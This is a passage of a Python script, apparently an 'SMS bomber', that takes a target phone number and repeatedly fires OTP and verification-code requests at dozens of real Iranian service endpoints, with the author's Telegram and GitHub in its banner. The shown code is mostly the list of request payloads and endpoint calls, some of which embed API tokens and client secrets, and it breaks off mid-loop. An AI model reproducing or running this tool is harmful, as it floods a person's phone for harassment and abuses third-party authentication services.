...
print (f"""
          ...
          {lrd}Channel Telegram :{lgn} https://t.me/javad72m 
          
          {lrd}Github :{lgn} github.com/javad72m 
          
    {lrd}Communication with the manufacturer : {lgn}javad72m @yahoo.com
{lrd}
...
( /￣∪           
""")
javad72m  = input(f"""{lrd}┌─<({cn}SMS{gn}@javad72m {lrd})-{yw}[~]{lrd}>
...
Api = [
        {"phone":javad72m },
        {"credential":{"phoneNumber":javad72m ,"role":"PASSENGER"}},
        {"api_version":"3","method":"sendCode","data":{"phone_number":javad72m ,"send_type":"SMS"}},
        {"cellphone":javad72m },
        "send=1&cellphone="+javad72m ,
        "cellNumber="+javad72m ,
        {"phoneNumber":javad72m },
        {"mobile":javad72m ,"country_code":"IR","provider_code":"RUBIKA"},
        {"phone":javad72m },
        {"credential":{"phoneNumber":javad72m ,"role":"PASSENGER"}},
        {"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":javad72m }}},
        {"phone":javad72m },
        {"data":{"mobile":javad72m },"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"},
        {"cellphone":javad72m },
        {"mobile":javad72m },
        {"username":javad72m ,"captchaHash":"","captchaValue":""},
        {"phone":javad72m },
        {"mobile":javad72m },
        {"username":javad72m },
        {"number":javad72m },
        {"phoneNumber":javad72m ,"AuthenticationMode":1},
        {"mobile":javad72m },
        {"MobileNumber":javad72m ,"type":""},
        {"phone":javad72m },
        {"phone":javad72m },
        {"cellNumber":javad72m ,"device":{"deviceId":"f227ed1a-3ddf-4f42-bbea-606440e1ccb8","deviceModel":"WEB_BROWSER",        "deviceAPI":"WEB_BROWSER","osName":"WEB"}},
        {"mobile":javad72m },
        {"phone":javad72m ,"headers":{"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"}},
        {"mobile":javad72m },
        { 'cellphone':javad72m },
        {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":javad72m },
        {"mobile":javad72m ,"country_code":"+98"},
        {"UserName":javad72m },
        {"method":"phone","identifier":javad72m },
        {"username":javad72m },
        {"credential":{"phoneNumber":javad72m ,"role":"PASSENGER"},"otpOption":"SMS"},
        {"cellphone":javad72m },
        {"Type":3,"Username":javad72m ,"Password":None,"SourceChannel":"GF_L_40107_02","SourcePlatform":"OS","SourcePlatformAgentType":"Browser Name","SourcePlatformVersion":"Browser Version","FriendInviteCode":"FriendInviteCode","FreePackage":False,"GiftCode":None,"AppLog":{"DeviceName":"DeviceName","VersionName":"VersionName","VersionCode":0,"DeviceModel":"DeviceModel","OsVersion":"OsVersion","PhoneNo":javad72m ,"Email":"Email"}},
        {"way":"mobile","identity":javad72m ,"captchaPassToken":"9e928d74-4766-45dc-94ef-0ff4699b500f"},
        {"code":"98","phone":javad72m ,"smsStatus":"default"},       
]
for i in range(int(NUmb)):
    ...
    try:
        ...
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api35 = get (f'https://api.binjo.ir/api/panel/get_code/{javad72m }')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")        
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api36 = get (f'https://core.gap.im/v1/user/add.json?mobile={javad72m }')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api37 = get (f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{javad72m }')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")   
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api38 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{javad72m }/sms?cCode=')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")       
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api39 = get (f'https://etma.ir/fa/Account/IsExistUserName?userName={javad72m }')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api40 = get (f'https://api.digighate.com/user/code?phone={javad72m }')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api41 = get (f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={javad72m }&source=2&sendTokenIfNot=true')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")          
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api42 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{javad72m }/sms?cCode=+98')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")           
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api43 = get (f'https://behandam.kermany.com/fitamin-central-service/api/fitamin/v2/register/status?mobile={javad72m }')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")            
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
        api44 = get (f'https://filmnet.ir/api-v2/access-token/users/{javad72m }/otp')
        print (f"{rd}[{lgn}+{rd}]{gn} Sent")         
    except:
        print (f"{lrd}[{lgn}-{lrd}]{rd} No sent")
    try:
